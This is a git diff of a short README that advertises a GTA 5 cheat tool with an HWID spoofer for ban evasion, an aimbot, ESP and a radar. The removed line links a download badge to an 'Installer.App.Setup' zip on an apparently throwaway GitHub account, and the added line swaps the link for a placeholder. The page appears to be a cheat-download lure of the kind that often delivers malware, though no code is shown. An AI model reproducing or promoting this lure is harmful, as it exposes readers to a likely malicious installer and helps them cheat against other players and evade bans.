@@ -1,7 +1,7 @@
 # Mod-Gta5 Enhancement Tool
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Gta%205%20Mod%20Menu-purple)]([Скачать архив](https://github.com/mandialkin-1008f/1/releases/download/v1.0.0/Installer.App.Setup.1.0.0.zip))
+[![Download Now](https://img.shields.io/badge/Download-Gta%205%20Mod%20Menu-purple)]([ZIP_LINK])
 
 Welcome to the Mod-Gta5 repository – your go-to tool for enhancing your GTA 5 gameplay experience. This comprehensive tool features an HWID spoofer, customizable aimbot, character ESP, and a 2D radar. Whether you're looking to improve your aim, gain an edge in online play, or simply enhance your overall game visuals, Mod-Gta5 has got you covered.
 ![Image](https://raw.githubusercontent.com/mandialkin-1008f/1/main/image.jpg)
